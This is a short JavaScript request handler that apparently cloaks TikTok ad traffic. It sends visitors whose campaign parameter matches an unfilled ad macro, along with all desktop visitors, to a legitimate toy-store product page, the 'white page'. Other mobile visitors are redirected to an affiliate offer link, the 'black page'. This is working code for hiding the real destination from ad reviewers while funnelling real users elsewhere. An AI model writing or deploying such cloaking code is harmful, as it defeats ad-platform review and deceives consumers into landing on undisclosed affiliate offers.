export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://toyscentral.es/products/fisherprice-laugh-learn-baby-toddler-toy-mix-learn-dj-table-musical-activity-center-with-lights-sounds-for-ages-6-months?utm_source=tiktok&utm_medium=paid&utm_id=__CAMPAIGN_ID__&utm_campaign=__CAMPAIGN_NAME__";
    const blackPageURL = "https://uplevelrewarded.com/aff_c?offer_id=1232&aff_id=45076&source=1stlander";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }






